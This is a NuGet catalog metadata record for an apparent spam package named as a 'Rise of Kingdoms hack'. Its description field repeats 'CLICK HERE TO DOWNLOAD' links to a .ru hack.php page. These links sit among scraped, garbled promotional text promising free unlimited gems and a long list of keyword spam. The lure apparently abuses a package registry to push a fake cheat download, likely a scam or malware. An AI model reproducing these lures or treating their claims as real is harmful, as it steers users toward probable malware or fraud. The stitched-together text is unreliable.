{
  "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.17.52.22/_rise-of-kingdoms-hack-working-2022-version-xrd.3.5.45.json",
  "@type": [
    "PackageDetails",
    "catalog:Permalink"
  ],
  "authors": "SharpCrafters s.r.o.",
  "catalog:commitId": "a3dd42e2-e076-4280-85cc-9440046e7019",
  "catalog:commitTimeStamp": "2022-01-26T17:52:22.9356206Z",
  "created": "2022-01-26T17:49:58.763Z",
  "description": "# _Rise of Kingdoms hack Working 2022 Version xrd\n\n\nCLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; [http://15.bltadwin.ru/hack.php](http://15.bltadwin.ru/hack.php)\n\n\nRise of Kingdoms Hack ==== https://supergamecom/hack/rise-of-kingdoms One of the most important parts in Rise Of Kingdoms are the gems and the huge. Download Apk Latest Version of Rise of Kingdoms MOD, The Strategy Game For Rise of Kingdoms Mod on your Android Device today you're able to Hack that. A rise of kingdoms hack is any sort of exploit that can be used to gain an advantage in game. These include hacks that earn free gems or generate other.\n\n## [CLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; http://15.bltadwin.ru/hack.php](http://15.bltadwin.ru/hack.php)\n\n · Best Working Rise of Kingdoms Hacks Upgrade Commander Skill to 5 Before Upgrading Stars. This is probably one of the most underrated Rise of Kingdoms hacks that all new players have to know before getting further into the game. The commanders play a huge part in every aspect of Rise of Kingdoms. Without commanders, you cannot farm, cannot /5(13). [Gem Generator for ROK] Rise of Kingdoms hack CLICK 🌐 icon below to use the hack! Rise of Kingdoms Hack  Cheat - Unlimited Gems For FREE! - We proudly presents the newest Rise of Kingdoms online hack which will generate unlimited Rise of Kingdoms resources for you, just in 5 minutes - % FREE!When you initially start to play your chosen Rise of .  · Rise of Kingdoms is a warfare game. It has exceptional graphics that is why players feel comfortable while enjoying the game. At the first time of the game, you will begin out of a little village or city. You need to improve your city buildings to boost your culture. The principal building of the city is the City Hall.\n\nrise of kingdoms hack free gems, rise of kingdoms hack 2021, rise of kingdoms hack android, rise of kingdoms hack codes, rise of kingdoms hacks facebook, rise of kingdoms hack apk, rise of kingdoms hack ios, rise of kingdoms hack free gems generator, rise of kingdoms hack reddit, rise of kingdoms hack apk ios, rise of kingdoms hack app, rise of kingdoms hack account, rise of kingdoms hack appvn, rise of kingdoms gems hack apk, rise of kingdoms hacks and cheats, rise of kingdoms hacks, rise of kingdoms hack without verification, rise of kingdoms hack without human verification, rise of kingdoms hack gems, rise of kingdoms hack bluestacks, rise of kingdoms hack bot, can rise of kingdoms be hacked, bản hack rise of kingdoms, rise of kingdoms hack cheat engine, rise of kingdoms hack cydia, rise of kingdoms redeem code hack, rise of kingdoms hack 2021 cheats free unlimited gems, can you hack rise of kingdoms, how can i hack rise of kingdoms, rise of kingdoms lost crusade hack, rise of kingdoms hack download, hack de gems rise of kingdoms, rise of kingdoms hack ios download, rise of dynasty three kingdoms hack, descargar rise of kingdoms hack apk 2020, hack de rise of kingdoms, hack diamond rise of kingdoms, hướng dẫn hack rise of kingdoms, rise of kingdoms hack español, rise of kingdoms fog exploration hack, rise of kingdoms edelsteine hack, rise of kingdoms hack free gems generator no survey, rise of kingdoms hack free gems generator no survey facebook, rise of kingdoms hack facebook, rise of kingdoms hack for ios, rise of kingdoms hack free, rise of kingdoms hack full, rise of kingdoms hack gems without human verification, rise of kingdoms hack game guardian, rise of kingdoms gem hack reddit, rise of kingdoms gem hack 2020, how to hack rise of kingdoms with lucky patcher, how to hack rise of kingdoms account, how to hack rise of kingdoms ios, hack rise of kingdoms happymod, rise of kingdoms how to hack, hack for rise of kingdoms, rise of kingdoms hack ipa, rise of kingdoms hack iosgods, rise of kingdoms hack ios 2020, rise of kingdoms hack 2021 ios, rise of kingdoms hack jailbreak, hack rise of kingdoms lost crusade, hack game rise of kingdoms lost crusade, lucky mobile.com hack rise of kingd",
  "id": "_Rise-of-Kingdoms-hack-Working-2022-Version-xrd",
  "isPrerelease": false,
  "language": "en-US",
  "lastEdited": "2022-01-26T17:52:00.977Z",
  "listed": true,
  "packageHash": "M6GeWVs1amz4FDgS69kxkWErJtgGl6JiaNN/o051kDgajomp9tpgIGt8Zl+8+3K5eJZCwalHR4Ub8bjsaCvmlw==",
  "packageHashAlgorithm": "SHA512",
  "packageSize": 11631,
  "published": "2022-01-26T17:49:58.763Z",
  "requireLicenseAcceptance": false,
  "title": "_Rise-of-Kingdoms-hack-Working-2022-Version-xrd",
  "verbatimVersion": "3.5.45",
  "version": "3.5.45",
  "packageEntries": [
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.17.52.22/_rise-of-kingdoms-hack-working-2022-version-xrd.3.5.45.json#bffmzwrpvh.nuspec",
      "@type": "PackageEntry",
      "compressedLength": 1500,
      "fullName": "bffmzwrpvh.nuspec",
      "length": 4476,
      "name": "bffmzwrpvh.nuspec"
    },
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.17.52.22/_rise-of-kingdoms-hack-working-2022-version-xrd.3.5.45.json#.signature.p7s",
      "@type": "PackageEntry",
      "compressedLength": 9471,
      "fullName": ".signature.p7s",
      "length": 9471,
      "name": ".signature.p7s"
    }
  ],
  "@context": {
    "@vocab": "http://schema.nuget.org/schema#",
    "catalog": "http://schema.nuget.org/catalog#",
    "xsd": "http://www.w3.org/2001/XMLSchema#",
    "dependencies": {
      "@id": "dependency",
      "@container": "@set"
    },
    "dependencyGroups": {
      "@id": "dependencyGroup",
      "@container": "@set"
    },
    "packageEntries": {
      "@id": "packageEntry",
      "@container": "@set"
    },
    "packageTypes": {
      "@id": "packageType",
      "@container": "@set"
    },
    "supportedFrameworks": {
      "@id": "supportedFramework",
      "@container": "@set"
    },
    "tags": {
      "@id": "tag",
      "@container": "@set"
    },
    "vulnerabilities": {
      "@id": "vulnerability",
      "@container": "@set"
    },
    "published": {
      "@type": "xsd:dateTime"
    },
    "created": {
      "@type": "xsd:dateTime"
    },
    "lastEdited": {
      "@type": "xsd:dateTime"
    },
    "catalog:commitTimeStamp": {
      "@type": "xsd:dateTime"
    },
    "reasons": {
      "@container": "@set"
    }
  }
}